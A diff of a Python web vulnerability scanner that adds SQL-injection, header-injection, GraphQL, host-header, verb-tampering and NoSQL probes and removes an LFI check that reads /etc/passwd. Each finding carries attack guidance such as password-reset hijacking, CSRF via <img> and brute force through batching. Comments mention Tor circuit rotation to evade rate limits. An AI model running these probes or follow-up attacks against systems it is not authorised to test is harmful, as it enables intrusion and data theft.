                     location = resp.headers.get("Location", "")
@@ -2918,9 +3672,23 @@ class VulnScanner:
         if the SQL error pattern appears ONLY in the injected response (not the baseline),
         which eliminates false positives from generic error pages or debug-mode sites that
         always show SQL traces.
+
+        Also tries a broader payload set for the same parameter —
+        apostrophe, double-quote, and an OR-TRUE comment. The old
+        code only tried the apostrophe, which misses every int-
+        context parameter.
         """
         findings = []
         test_params = self._get_test_params(["id", "page", "q", "search", "user", "item", "cat"])
+
+        # Ordered payload set. Each payload is '<raw>' as passed to
+        # the URL query string; we URL-encode it per request.
+        probes = [
+            ("'",  "'"),
+            ('"',  '"'),
+            (" OR 1=1-- -", " OR 1=1-- -"),
+            ("' OR '1'='1'-- -", "' OR '1'='1'-- -"),
+        ]
 
         for param in test_params[:5]:
             if shutdown_requested():
@@ -2928,23 +3696,33 @@ class VulnScanner:
             # Baseline: clean request with a safe value
             baseline_url = f"{base_url}?{param}=1"
             baseline_resp = self._session.get(baseline_url, allow_wayback=False)
-            baseline_text = baseline_resp.text[:5000] if baseline_resp else ""
+            # If the baseline request failed, we have nothing to compare
+            # against. Treating "no baseline" as "pattern absent in baseline"
+            # turned every transient network failure into a false-positive
+            # SQLi hit. Skip this parameter instead.
+            if not baseline_resp or not baseline_resp.text:
+                continue
+            baseline_text = baseline_resp.text[:5000]
 
-            # Payload: single apostrophe injection
-            test_url = f"{base_url}?{param}=1%27"
-            resp = self._session.get(test_url, allow_wayback=False)
-            if resp and resp.text:
+            for probe_name, payload in probes:
+                if shutdown_requested():
+                    break
+                test_url = f"{base_url}?{param}=1{quote(payload)}"
+                resp = self._session.get(test_url, allow_wayback=False)
+                if not resp or not resp.text:
+                    continue
                 for indicator in self.SQLI_INDICATORS:
-                    # Only count if the pattern is NEW in the injected response
                     in_payload = indicator.search(resp.text[:5000])
-                    in_baseline = indicator.search(baseline_text) if baseline_text else False
+                    in_baseline = indicator.search(baseline_text)
                     if in_payload and not in_baseline:
                         findings.append({
                             "severity": SEV_CRITICAL,
                             "title": f"SQL injection indicator via '{param}' parameter",
-                            "detail": "SQL error message appears ONLY in response to apostrophe injection "
-                                      "(not in baseline). Input likely reaches SQL query without parameterization.",
-                            "evidence": f"Parameter: {param}, matched: {indicator.pattern[:60]}",
+                            "detail": ("SQL error message appears ONLY in response "
+                                       f"to probe '{probe_name}' (not in baseline). "
+                                       "Input likely reaches SQL query without "
+                                       "parameterization."),
+                            "evidence": f"Parameter: {param}, probe: {probe_name}, matched: {indicator.pattern[:60]}",
                             "exploitable": True,
                             "test_url": test_url,
                             "exploit_info": {
@@ -2956,6 +3734,73 @@ class VulnScanner:
                             },
                         })
                         return findings
+        return findings
+
+    def _check_sqli_headers(self, base_url: str) -> List[dict]:
+        """Detect SQLi in request headers the app logs or passes to SQL.
+
+        Apps that log User-Agent / Referer / X-Forwarded-For into a
+        DB without parameterization are extremely common and usually
+        go undetected by URL-param scanners. Probe the canonical
+        loggable headers with a single-quote and look for SQL errors
+        in the response body.
+
+        Not every target will echo its own errors to the page (most
+        log them silently), so this is an upper-bound probe —
+        positives are strong, negatives don't mean clean.
+        """
+        findings = []
+        baseline = self._session.get(base_url, allow_wayback=False)
+        if not baseline or not baseline.text:
+            return findings
+        baseline_text = baseline.text[:6000]
+
+        probe_headers = (
+            "User-Agent", "Referer", "X-Forwarded-For",
+            "X-Real-IP", "X-Client-IP", "Cookie",
+        )
+        for hname in probe_headers:
+            if shutdown_requested():
+                break
+            # Use `Mozilla/5.0'` for User-Agent — breaking the
+            # existing string mid-value is the most likely to reach
+            # a logging query.
+            if hname == "Cookie":
+                payload_val = f"sess=gs{secrets.token_hex(4)}'"
+            else:
+                payload_val = f"gs{secrets.token_hex(4)}'"
+            resp = self._session.request(
+                "GET", base_url,
+                extra_headers={hname: payload_val},
+            )
+            if not resp or not resp.text:
+                continue
+            body = resp.text[:6000]
+            for indicator in self.SQLI_INDICATORS:
+                if indicator.search(body) and not indicator.search(baseline_text):
+                    findings.append({
+                        "severity": SEV_HIGH,
+                        "title": f"SQL error reflected in response to injected {hname} header",
+                        "detail": (f"Setting {hname} to a value containing "
+                                   f"a single quote caused a database "
+                                   f"error to appear in the response. "
+                                   f"Common SQLi-via-logging pattern."),
+                        "evidence": f"{hname}: {payload_val[:40]}, matched: {indicator.pattern[:60]}",
+                        "exploitable": True,
+                        "test_url": base_url,
+                        "exploit_info": {
+                            "type": "sqli",
+                            "parameter": f"header:{hname}",
+                            "method": (f"Inject into {hname}. Works "
+                                       f"against apps that log requests "
+                                       f"to a DB. Good starting point: "
+                                       f"try UNION SELECT via "
+                                       f"time-based blind because "
+                                       f"errors don't always echo."),
+                            "risk": "Database compromise via a header the WAF rarely inspects",
+                        },
+                    })
+                    return findings
         return findings
 
     def _check_xss_reflection(self, base_url: str) -> List[dict]:
@@ -3059,53 +3904,207 @@ class VulnScanner:
                         return findings
         return findings
 
+    # Common GraphQL mount points. Ordered by how likely they are.
+    _GQL_PATHS = [
+        "/graphql", "/graphql/", "/api/graphql", "/v1/graphql",
+        "/v2/graphql", "/query", "/gql", "/api/gql",
+        "/index.php?graphql", "/api/v1/graphql",
+    ]
+
     def _check_graphql_introspection(self, base_url: str) -> List[dict]:
-        """Check if GraphQL introspection is enabled (exposes full API schema)."""
+        """Probe GraphQL endpoints and detect multiple misconfigs:
+
+        1. Introspection enabled (the classic finding).
+        2. GET-based query execution (GraphQL-over-GET, exploitable
+           for CSRF — state-changing mutations via a 1x1 <img src=...>).
+        3. Batched-query / alias amplification accepted (brute-force
+           within a single request, bypasses rate limits).
+        4. Specific sensitive types present in the schema (User,
+           Credential, Session, etc.) — emitted as an additional
+           HIGH finding pointing at the concrete types.
+        """
         findings = []
-        gql_paths = ["/graphql", "/graphql/", "/api/graphql", "/v1/graphql"]
-        introspection_query = {"query": '{ __schema { types { name } } }'}
         domain = urlparse(base_url).netloc
 
-        for gql_path in gql_paths:
-            if shutdown_requested():
-                break
-            if self._session.is_domain_blocked(domain):
+        intro_short = {"query": "{ __schema { queryType { name } } }"}
+        intro_full = {"query": "{ __schema { types { name fields { name } } } }"}
+
+        for gql_path in self._GQL_PATHS:
+            if shutdown_requested() or self._session.is_domain_blocked(domain):
                 break
             url = urljoin(base_url, gql_path)
+
+            # A. Confirm the endpoint exists with a short introspection.
+            r_short = self._session.post_json(url, intro_short)
+            if not r_short or r_short.status_code not in (200, 400):
+                continue
             try:
-                self._session._delay_for_domain(domain)
-                self._session._maybe_rotate_circuit()
-                resp = self._session._session.post(
-                    url, json=introspection_query, timeout=REQUEST_TIMEOUT,
-                    proxies=self._session._proxy, headers=_pick_profile()
-                )
-                if resp and resp.status_code == 200:
+                d_short = r_short.json()
+            except Exception:
+                continue
+            # A GraphQL endpoint returns either data.__schema or
+            # errors[].message mentioning a query. Either confirms it
+            # IS GraphQL; neither means we're hitting a 404-page-that-
+            # happens-to-return-200.
+            has_schema = bool(isinstance(d_short.get("data"), dict) and
+                              d_short["data"].get("__schema"))
+            errs = d_short.get("errors", []) if isinstance(d_short, dict) else []
+            looks_gql = has_schema or bool(errs) or d_short.get("data") is not None
+            if not looks_gql:
+                continue
+
+            # B. Full introspection — emits the main finding if it works.
+            if has_schema:
+                r_full = self._session.post_json(url, intro_full)
+                types = []
+                if r_full and r_full.status_code == 200:
                     try:
-                        data = resp.json()
-                        if data.get("data", {}).get("__schema"):
-                            types = data["data"]["__schema"].get("types", [])
-                            type_names = [t.get("name", "") for t in types[:10]]
-                            findings.append({
-                                "severity": SEV_HIGH,
-                                "title": f"GraphQL introspection enabled at {gql_path}",
-                                "detail": "Full API schema exposed. Attacker can discover all "
-                                          "queries, mutations, types, and fields — then craft "
-                                          "targeted queries to extract sensitive data.",
-                                "evidence": f"Schema returned {len(types)} types: {', '.join(type_names[:5])}...",
-                                "exploitable": True,
-                                "exploit_info": {
-                                    "type": "graphql_introspection",
-                                    "path": gql_path,
-                                    "method": "POST introspection query to enumerate full schema, "
-                                              "then query for sensitive types (User, Account, Order, etc.)",
-                                    "risk": "Data exfiltration of all API-accessible data",
-                                },
-                            })
-                            return findings
-                    except (ValueError, KeyError):
-                        pass
-            except Exception as e:
-                integrity_log("intel", f"unknown_error:{type(e).__name__}")
+                        types = (r_full.json().get("data", {})
+                                 .get("__schema", {}).get("types", []))
+                    except Exception:
+                        types = []
+                type_names = [t.get("name", "") for t in types
+                              if isinstance(t, dict) and t.get("name")]
+                sensitive_types = [
+                    n for n in type_names
+                    if any(kw in n.lower() for kw in
+                           ("user", "account", "credential", "session",
+                            "token", "secret", "payment", "order",
+                            "invoice", "admin"))
+                ]
+                findings.append({
+                    "severity": SEV_HIGH,
+                    "title": f"GraphQL introspection enabled at {gql_path}",
+                    "detail": ("Full API schema exposed. Attacker can "
+                               "discover all queries, mutations, types, "
+                               "and fields — then craft targeted queries "
+                               "to extract sensitive data."),
+                    "evidence": (f"Schema returned {len(type_names)} types. "
+                                 f"Sample: {', '.join(type_names[:5])}"
+                                 f"{'...' if len(type_names) > 5 else ''}"),
+                    "exploitable": True,
+                    "test_url": url,
+                    "exploit_info": {
+                        "type": "graphql_introspection",
+                        "path": gql_path,
+                        "sensitive_types": sensitive_types[:10],
+                        "method": ("POST full introspection, then query "
+                                   "sensitive types directly. Common "
+                                   "dumps: '{ users { id email } }', "
+                                   "'{ me { role } }', '{ orders { "
+                                   "userId total } }'."),
+                        "risk": "Data exfiltration of all API-accessible data",
+                    },
+                })
+                if sensitive_types:
+                    findings.append({
+                        "severity": SEV_HIGH,
+                        "title": (f"GraphQL exposes sensitive type(s): "
+                                  f"{', '.join(sensitive_types[:5])}"),
+                        "detail": (f"The schema defines "
+                                   f"{len(sensitive_types)} type name(s) "
+                                   f"that look like auth/user/payment "
+                                   f"primitives. Direct queries against "
+                                   f"these types, authenticated or not, "
+                                   f"are often unrestricted."),
+                        "evidence": f"Types: {', '.join(sensitive_types[:10])}",
+                        "exploitable": True,
+                        "test_url": url,
+                        "exploit_info": {
+                            "type": "graphql_data_exposure",
+                            "path": gql_path,
+                            "sensitive_types": sensitive_types[:10],
+                            "method": ("Craft per-type queries "
+                                       "following the schema's "
+                                       "fields[]. Many endpoints "
+                                       "enforce auth on REST but not "
+                                       "GraphQL."),
+                            "risk": "Unauthenticated data exfiltration",
+                        },
+                    })
+
+            # C. GraphQL-over-GET (CSRF class): same query via GET.
+            if not shutdown_requested():
+                from urllib.parse import quote as _q
+                q = "{ __schema { queryType { name } } }"
+                get_url = f"{url}?query={_q(q)}"
+                r_get = self._session.get(get_url, allow_wayback=False)
+                if r_get and r_get.status_code == 200 and r_get.text:
+                    try:
+                        d_get = r_get.json()
+                    except Exception:
+                        d_get = None
+                    if (isinstance(d_get, dict) and
+                            isinstance(d_get.get("data"), dict) and
+                            d_get["data"].get("__schema")):
+                        findings.append({
+                            "severity": SEV_HIGH,
+                            "title": f"GraphQL accepts queries via GET at {gql_path}",
+                            "detail": ("GraphQL-over-GET makes every "
+                                       "mutation CSRF-exploitable: "
+                                       "<img src=...?query=mutation...> "
+                                       "fires with the victim's cookies "
+                                       "attached. CSRF tokens don't "
+                                       "apply to GETs."),
+                            "evidence": f"GET {gql_path}?query=... returned __schema",
+                            "exploitable": True,
+                            "test_url": url,
+                            "exploit_info": {
+                                "type": "graphql_introspection",
+                                "path": gql_path,
+                                "method": ("Craft a GET URL with a "
+                                           "state-changing mutation as "
+                                           "the query and embed it in "
+                                           "an <img> on an attacker "
+                                           "page. Victim cookies "
+                                           "authenticate it."),
+                                "risk": "CSRF on every GraphQL mutation",
+                            },
+                        })
+
+            # D. Batched-query amplification check.
+            # Many servers execute a list of queries in a single request —
+            # the perfect rate-limit bypass for brute-force (login
+            # mutations, one-time-password guesses, etc.).
+            if not shutdown_requested():
+                batch = [intro_short, intro_short, intro_short]
+                r_batch = self._session.post_json(url, batch)
+                if r_batch and r_batch.status_code == 200 and r_batch.text:
+                    try:
+                        d_batch = r_batch.json()
+                    except Exception:
+                        d_batch = None
+                    if isinstance(d_batch, list) and len(d_batch) >= 2:
+                        findings.append({
+                            "severity": SEV_MEDIUM,
+                            "title": f"GraphQL accepts batched queries at {gql_path}",
+                            "detail": ("The server returned a list of "
+                                       "responses for a batched query "
+                                       "array. Combine with a login "
+                                       "mutation and you get N "
+                                       "password guesses per HTTP "
+                                       "request — rate limits applied "
+                                       "per HTTP request can be "
+                                       "bypassed."),
+                            "evidence": f"Batch of {len(batch)} queries → list of {len(d_batch)} results",
+                            "exploitable": True,
+                            "test_url": url,
+                            "exploit_info": {
+                                "type": "graphql_batching",
+                                "path": gql_path,
+                                "method": ("POST [{mutation: login(x)}, "
+                                           "{mutation: login(y)}, ...] "
+                                           "— one HTTP request, many "
+                                           "login attempts."),
+                                "risk": "Rate-limit bypass, brute-force amplification",
+                            },
+                        })
+
+            # We found a live GraphQL endpoint; no point probing more
+            # paths. (Multiple mounts of the same service at different
+            # paths would just repeat the same findings.)
+            if findings:
+                return findings
         return findings
 
     def _check_ssrf_indicators(self, base_url: str) -> List[dict]:
@@ -3159,53 +4158,6 @@ class VulnScanner:
                     return findings
         return findings
 
-    def _check_lfi(self, base_url: str) -> List[dict]:
-        """Check for Local File Inclusion (LFI) vulnerabilities."""
-        findings = []
-        lfi_params = self._get_test_params(["page", "file", "include", "template", "path", "doc", "view"])
-        lfi_payloads = [
-            ("..%2F..%2F..%2F..%2Fetc%2Fpasswd", "etc/passwd via URL encoding"),
-            ("....//....//....//....//etc/passwd", "etc/passwd via double-dot bypass"),
-            ("/etc/passwd", "etc/passwd direct path"),
-            ("php://filter/convert.base64-encode/resource=index.php",
-             "PHP filter wrapper — reads source code as base64"),
-        ]
-        passwd_indicators = [
-            re.compile(r"root:.*:0:0:"),
-            re.compile(r"daemon:.*:/usr/sbin"),
-            re.compile(r"www-data:"),
-        ]
-
-        for param in lfi_params[:5]:
-            for payload, desc in lfi_payloads[:2]:
-                if shutdown_requested():
-                    return findings
-                test_url = f"{base_url}?{param}={payload}"
-                resp = self._session.get(test_url, allow_wayback=False)
-                if resp and resp.text:
-                    for ind in passwd_indicators:
-                        if ind.search(resp.text[:3000]):
-                            findings.append({
-                                "severity": SEV_CRITICAL,
-                                "title": f"Local File Inclusion via '{param}' parameter",
-                                "detail": "Arbitrary local files readable through the web server. "
-                                          "Attacker can read /etc/passwd, config files, source code, "
-                                          "and potentially achieve RCE via log poisoning.",
-                                "evidence": f"Parameter: {param}, payload: {desc}",
-                                "exploitable": True,
-                                "exploit_info": {
-                                    "type": "lfi",
-                                    "parameter": param,
-                                    "method": f"Supply file paths via '{param}'. "
-                                              "Read sensitive files: /etc/passwd, /etc/shadow (if readable), "
-                                              "application config files, database credentials. "
-                                              "For RCE: poison access logs then include them.",
-                                    "risk": "Full file system read, potential remote code execution",
-                                },
-                            })
-                            return findings
-        return findings
-
     def _check_command_injection(self, base_url: str) -> List[dict]:
         """Check for OS command injection indicators."""
         findings = []
@@ -3250,55 +4202,765 @@ class VulnScanner:
                 return findings
         return findings
 
+    # Subdomain-takeover service fingerprints. Kept at class scope so
+    # ExploitVerifier can read the same table for replay-confirmation.
+    TAKEOVER_FINGERPRINTS = {
+        "github.io":         ("GitHub Pages",   "there isn't a github pages site here"),
+        "herokuapp.com":     ("Heroku",         "no such app"),
+        "herokudns.com":     ("Heroku (dns)",   "no such app"),
+        "herokussl.com":     ("Heroku (ssl)",   "no such app"),
+        "s3.amazonaws.com":  ("AWS S3",         "nosuchbucket"),
+        "s3-website":        ("AWS S3 (website)", "nosuchbucket"),
+        "azurewebsites.net": ("Azure Websites", "404 web site not found"),
+        "cloudapp.net":      ("Azure Classic",  "microsoft-iis/7.5"),
+        "cloudapp.azure.com":("Azure Cloud",    "microsoft-iis/"),
+        "trafficmanager.net":("Azure Traffic Manager", "page you requested was not found"),
+        "cloudfront.net":    ("CloudFront",     "the request could not be satisfied"),
+        "shopify.com":       ("Shopify",        "sorry, this shop is currently unavailable"),
+        "myshopify.com":     ("Shopify (myshopify)", "sorry, this shop is currently unavailable"),
+        "fastly.net":        ("Fastly",         "fastly error: unknown domain"),
+        "ghost.io":          ("Ghost",          "the thing you were looking for is no longer here"),
+        "surge.sh":          ("Surge",          "project not found"),
+        "bitbucket.io":      ("Bitbucket",      "repository not found"),
+        "readthedocs.io":    ("Read the Docs",  "unknown to read the docs"),
+        "readthedocs.org":   ("Read the Docs",  "unknown to read the docs"),
+        "netlify.com":       ("Netlify",        "not found - request id"),
+        "netlify.app":       ("Netlify (app)",  "not found - request id"),
+        "vercel.app":        ("Vercel",         "the deployment could not be found"),
+        "now.sh":            ("Vercel (now)",   "the deployment could not be found"),
+        "pantheonsite.io":   ("Pantheon",       "the gods are wise, but do not know of the site which you seek"),
+        "pantheon.io":       ("Pantheon",       "the gods are wise"),
+        "zendesk.com":       ("Zendesk",        "help center closed"),
+        "uservoice.com":     ("UserVoice",      "this uservoice subdomain is currently available"),
+        "helpscoutdocs.com": ("Help Scout",     "no settings were found for this company"),
+        "tumblr.com":        ("Tumblr",         "whatever you were looking for doesn't currently exist at this address"),
+        "desk.com":          ("Desk.com",       "please try again or try desk.com/contact-us"),
+        "fly.dev":           ("Fly.io",         "this app has no running instances"),
+        "appspot.com":       ("Google App Engine", "404 - server not found"),
+        "webflow.io":        ("Webflow",        "the page you are looking for doesn't exist or has been moved"),
+        "canny.io":          ("Canny",          "company not found"),
+        "strikingly.com":    ("Strikingly",     "page not found"),
+        "smugmug.com":       ("SmugMug",        "page not found"),
+        "intercom.help":     ("Intercom",       "this page is reserved for artistic"),
+        "agilecrm.com":      ("Agile CRM",      "sorry, this page is no longer available"),
+        "tilda.ws":          ("Tilda",          "please renew your subscription"),
+        "tilda.cc":          ("Tilda",          "please renew your subscription"),
+        "wordpress.com":     ("WordPress.com",  "do you want to register"),
+        "blogspot.com":      ("Blogspot",       "blog not found"),
+        "statuspage.io":     ("Statuspage",     "this page is reserved for artistic"),
+        "mailgun.org":       ("Mailgun",        "mailgun domain is not found"),
+        "sendgrid.net":      ("SendGrid",       "the provided authentication"),
+        "fastmail.fm":       ("FastMail",       "fastmail does not serve"),
+        "pagerduty.com":     ("PagerDuty",      "account not found"),
+        "unbounceapps.com":  ("Unbounce",       "the requested url was not found on this server"),
+        "zoho.com":          ("Zoho",           "you have landed on an invalid"),
+        "cargocollective.com": ("Cargo",        "404 not found"),
+        "wishpond.com":      ("Wishpond",       "this page doesn't exist"),
+        "ngrok.io":          ("ngrok",          "tunnel"),
+        "smarterqueue.com":  ("SmarterQueue",   "page not found"),
+    }
+
     def _check_subdomain_takeover(self, domain: str, cnames: List[str]) -> List[dict]:
         """Check for subdomain takeover via dangling CNAME records."""
         findings = []
-        # Services that are commonly vulnerable to takeover when CNAME exists
-        # but the resource is unclaimed
-        takeover_fingerprints = {
-            "github.io": ("GitHub Pages", "There isn't a GitHub Pages site here"),
-            "herokuapp.com": ("Heroku", "no-such-app"),
-            "s3.amazonaws.com": ("AWS S3", "NoSuchBucket"),
-            "azurewebsites.net": ("Azure", "404 Web Site not found"),
-            "cloudfront.net": ("CloudFront", "The request could not be satisfied"),
-            "shopify.com": ("Shopify", "Sorry, this shop is currently unavailable"),
-            "fastly.net": ("Fastly", "Fastly error: unknown domain"),
-            "ghost.io": ("Ghost", "The thing you were looking for is no longer here"),
-            "surge.sh": ("Surge", "project not found"),
-            "bitbucket.io": ("Bitbucket", "Repository not found"),
-        }
 
         for cname in cnames:
             cname_lower = cname.lower().rstrip(".")
-            for service_domain, (service_name, fingerprint) in takeover_fingerprints.items():
-                if cname_lower.endswith(service_domain):
-                    # Verify: try to access the subdomain and check for takeover fingerprint
-                    for scheme in ["https", "http"]:
-                        try:
-                            resp = self._session.get(f"{scheme}://{domain}", allow_wayback=False)
-                            if resp and fingerprint.lower() in resp.text.lower():
-                                findings.append({
-                                    "severity": SEV_HIGH,
-                                    "title": f"Subdomain takeover possible via {service_name}",
-                                    "detail": f"CNAME points to {cname_lower} but the {service_name} "
-                                              f"resource is unclaimed. An attacker can claim it and "
-                                              f"serve arbitrary content on {domain}.",
-                                    "evidence": f"CNAME: {cname_lower}, fingerprint: '{fingerprint[:40]}'",
-                                    "exploitable": True,
-                                    "exploit_info": {
-                                        "type": "subdomain_takeover",
-                                        "service": service_name,
-                                        "cname": cname_lower,
-                                        "method": f"Register the unclaimed resource on {service_name} "
-                                                  f"to take control of {domain}. "
-                                                  f"Then serve phishing pages, steal cookies, or "
-                                                  f"bypass CSP/CORS restrictions.",
-                                        "risk": "Phishing, cookie theft, CSP bypass",
-                                    },
-                                })
-                                return findings
-                        except Exception as e:
-                            integrity_log("intel", f"unknown_error:{type(e).__name__}")
+            for service_domain, (service_name, fingerprint) in self.TAKEOVER_FINGERPRINTS.items():
+                if service_domain not in cname_lower:
+                    continue
+                # Verify: try to access the subdomain and check for takeover fingerprint
+                for scheme in ["https", "http"]:
+                    try:
+                        resp = self._session.get(f"{scheme}://{domain}", allow_wayback=False)
+                        if resp and fingerprint.lower() in resp.text.lower():
+                            findings.append({
+                                "severity": SEV_HIGH,
+                                "title": f"Subdomain takeover possible via {service_name}",
+                                "detail": f"CNAME points to {cname_lower} but the {service_name} "
+                                          f"resource is unclaimed. An attacker can claim it and "
+                                          f"serve arbitrary content on {domain}.",
+                                "evidence": f"CNAME: {cname_lower}, fingerprint: '{fingerprint[:40]}'",
+                                "exploitable": True,
+                                "exploit_info": {
+                                    "type": "subdomain_takeover",
+                                    "service": service_name,
+                                    "cname": cname_lower,
+                                    "method": f"Register the unclaimed resource on {service_name} "
+                                              f"to take control of {domain}. "
+                                              f"Then serve phishing pages, steal cookies, or "
+                                              f"bypass CSP/CORS restrictions.",
+                                    "risk": "Phishing, cookie theft, CSP bypass",
+                                },
+                            })
+                            return findings
+                    except Exception as e:
+                        integrity_log("intel", f"unknown_error:{type(e).__name__}")
+        return findings
+
+    def _check_host_header_injection(self, base_url: str) -> List[dict]:
+        """Detect Host-header injection / absolute-URL override.
+
+        Two signals:
+        1. The target reflects an attacker-controlled Host value back
+           into a Location header (password-reset URL poisoning class).
+        2. The target reflects X-Forwarded-Host into a Location or
+           into the body as an absolute URL.
+
+        Both are exploitable for cache poisoning, password-reset link
+        hijacking, and in some frameworks, auth bypass.
+        """
+        findings = []
+        domain = urlparse(base_url).netloc
+        if self._session.is_domain_blocked(domain):
+            return findings
+
+        marker = f"h{secrets.token_hex(4)}.example.test"
+        probes = [
+            ({"Host": marker}, "Host"),
+            ({"X-Forwarded-Host": marker}, "X-Forwarded-Host"),
+            ({"X-Forwarded-Server": marker}, "X-Forwarded-Server"),
+            ({"X-Host": marker}, "X-Host"),
+        ]
+        for headers, hname in probes:
+            if shutdown_requested() or self._session.is_domain_blocked(domain):
+                break
+            # allow_redirects=False so we can see what the server wrote
+            # in Location.
+            resp = self._session.request(
+                "GET", base_url,
+                allow_redirects=False,
+                extra_headers=headers,
+            )
+            if resp is None:
+                continue
+
+            # Signal 1: Location reflects the marker host.
+            loc = resp.headers.get("Location", "")
+            if loc:
+                loc_host = urlparse(loc).netloc.lower()
+                if loc_host == marker.lower():
+                    findings.append({
+                        "severity": SEV_HIGH,
+                        "title": f"Host-header injection via {hname}",
+                        "detail": (f"Server built the Location header using "
+                                   f"the attacker-supplied {hname}: value. "
+                                   f"Usable for password-reset link "
+                                   f"poisoning, cache poisoning, and in "
+                                   f"some frameworks auth-bypass."),
+                        "evidence": f"{hname}: {marker} → Location: {loc[:120]}",
+                        "exploitable": True,
+                        "test_url": base_url,
+                        "exploit_info": {
+                            "type": "host_header_injection",
+                            "header": hname,
+                            "method": (f"Send the target's password-reset "
+                                       f"flow with {hname}: attacker.com. "
+                                       f"The reset link in the victim's "
+                                       f"email will point at attacker.com."),
+                            "risk": "Password reset link hijacking, cache poisoning, auth bypass",
+                        },
+                    })
+                    return findings  # one reflected header is enough
+
+            # Signal 2: the body renders the marker as a same-origin absolute URL.
+            body = resp.text[:20000] if resp.text else ""
+            if marker in body:
+                # Make sure the marker appears in a URL-ish context
+                # (href=, src=, action=, or a literal http(s)://marker).
+                urlish = re.search(
+                    r"""(?:href|src|action)\s*=\s*['"][^'"]*""" + re.escape(marker)
+                    + r"""[^'"]*['"]""",
+                    body, re.I,
+                )
+                if urlish or f"//{marker}" in body or f"://{marker}" in body:
+                    findings.append({
+                        "severity": SEV_MEDIUM,
+                        "title": f"{hname} reflected as absolute URL in body",
+                        "detail": (f"Server rendered {hname}: into an "
+                                   f"absolute URL in the response body. "
+                                   f"Any generated links (emails, OAuth "
+                                   f"redirects) likely use this value — "
+                                   f"usable for cache poisoning."),
+                        "evidence": f"{hname}: {marker} appeared in HTML URL context",
+                        "exploitable": True,
+                        "test_url": base_url,
+                        "exploit_info": {
+                            "type": "host_header_injection",
+                            "header": hname,
+                            "method": (f"Poison cache by sending {hname}: "
+                                       f"attacker.com — cached response "
+                                       f"serves attacker URLs to everyone."),
+                            "risk": "Cache poisoning, link injection, phishing",
+                        },
+                    })
+                    return findings
+        return findings
+
+    def _check_http_verb_tampering(self, base_url: str) -> List[dict]:
+        """Detect auth bypass via alternate HTTP verbs.
+
+        Many WAFs + frameworks only protect the GET/POST path for a
+        protected resource. Sending PUT, DELETE, HEAD, PATCH, or the
+        override header 'X-HTTP-Method-Override: GET' can slip past
+        the rule and return 200 for a path that normally returns 403.
+        """
+        findings = []
+        domain = urlparse(base_url).netloc
+        if self._session.is_domain_blocked(domain):
+            return findings
+
+        # Pick candidate paths: start with /admin and any 403 we know.
+        candidates = ["/admin", "/admin/", "/admin/index", "/dashboard",
+                      "/api/admin", "/api/users"]
+        # If the scan has already crawled endpoints, include them.
+        if self._crawled_urls:
+            for ep in self._crawled_urls[:10]:
+                try:
+                    path = urlparse(ep["url"]).path
+                    if path and path not in candidates:
+                        candidates.append(path)
+                except Exception:
+                    continue
+
+        # Cap the total probe budget. Each path triggers 1 baseline + 6
+        # verbs + 1 override = 8 requests. 4 paths = 32 requests,
+        # which is enough to catch the common cases without killing a
+        # Tor circuit. Previous version allowed 8 paths = 64 requests,
+        # which almost always tripped the target's rate limit.
+        for path in candidates[:4]:
+            if shutdown_requested() or self._session.is_domain_blocked(domain):
+                break
+            url = urljoin(base_url, path)
+
+            # Baseline GET — only interesting when GET is walled.
+            g_resp = self._session.request(
+                "GET", url, allow_redirects=False,
+            )
+            if g_resp is None or g_resp.status_code not in (401, 403):
+                continue
+
+            found_this_path = False
+            for verb in ("HEAD", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"):
+                if shutdown_requested() or self._session.is_domain_blocked(domain):
+                    break
+                v_resp = self._session.request(
+                    verb, url, allow_redirects=False,
+                )
+                if v_resp is None:
+                    continue
+                # Bypass signal: verb returns 200 / 2xx while GET returned 403/401.
+                if 200 <= v_resp.status_code < 300:
+                    findings.append({
+                        "severity": SEV_HIGH,
+                        "title": f"HTTP verb tampering bypass at {path}",
+                        "detail": (f"GET {path} returns {g_resp.status_code} "
+                                   f"but {verb} {path} returns "
+                                   f"{v_resp.status_code}. WAF or framework "
+                                   f"auth check is verb-specific and can be "
+                                   f"bypassed by switching methods."),
+                        "evidence": f"GET→{g_resp.status_code}, {verb}→{v_resp.status_code}",
+                        "exploitable": True,
+                        "test_url": url,
+                        "exploit_info": {
+                            "type": "http_verb_tampering",
+                            "path": path,
+                            "method": (f"Send {verb} instead of GET — WAF's "
+                                       f"verb-specific auth check is "
+                                       f"bypassed. Works for admin panels "
+                                       f"protected only on GET."),
+                            "risk": "Auth bypass, admin access",
+                        },
+                    })
+                    found_this_path = True
+                    return findings
+            if found_this_path:
+                break
+            # Method-override header
+            o_resp = self._session.request(
+                "GET", url, allow_redirects=False,
+                extra_headers={"X-HTTP-Method-Override": "GET"},
+            )
+            if o_resp and 200 <= o_resp.status_code < 300:
+                findings.append({
+                    "severity": SEV_HIGH,
+                    "title": f"X-HTTP-Method-Override bypass at {path}",
+                    "detail": (f"GET {path} returns {g_resp.status_code} "
+                               f"but X-HTTP-Method-Override: GET returns "
+                               f"{o_resp.status_code}. Framework honors the "
+                               f"override header AFTER the WAF rule fires."),
+                    "evidence": f"GET→{g_resp.status_code}, override→{o_resp.status_code}",
+                    "exploitable": True,
+                    "test_url": url,
+                    "exploit_info": {
+                        "type": "http_verb_tampering",
+                        "path": path,
+                        "method": ("Send GET with header "
+                                   "'X-HTTP-Method-Override: GET' — the "
+                                   "framework treats it as the override "
+                                   "verb while the WAF already saw GET."),
+                        "risk": "Auth bypass, admin access",
+                    },
+                })
+                return findings
+        return findings
+
+    # Common NoSQL error signatures that leak from unparameterised queries.
+    NOSQL_INDICATORS = [
+        re.compile(r"MongoError|MongoServerError", re.I),
+        re.compile(r"E11000 duplicate key", re.I),
+        re.compile(r"CastError:.*ObjectId", re.I),
+        re.compile(r"\$where.*not allowed", re.I),
+        re.compile(r"BSON.*parse", re.I),
+        re.compile(r"Syntax error near.*\$ne", re.I),
+        re.compile(r"CouchDB error", re.I),
+        re.compile(r"Unable to parse.*Redis", re.I),
+        re.compile(r"mongoose.*ValidationError", re.I),
+        re.compile(r"unknown top level operator", re.I),
+    ]
+
+    def _check_nosql_injection(self, base_url: str) -> List[dict]:
+        """Detect MongoDB-style NoSQL injection via error signatures
+        plus a THREE-point boolean differential to kill false positives.
+
+        We compare three responses:
+          (a) baseline-bogus: ?p=<random> — the 'should-not-match' case
+          (b) baseline-plain: ?p=1 — the 'might-match' case
+          (c) ne-bogus: ?p[$ne]=<random> — the 'match-everything'
+              case IF the app interprets $ne
+
+        Real MongoDB injection makes (c) look like 'match everything',
+        which differs from BOTH (a) and (b). If (c) only differs from
+        (a) (but matches (b)), the framework is just coalescing
+        'param[$ne]=...' back to the plain-param behavior — common in
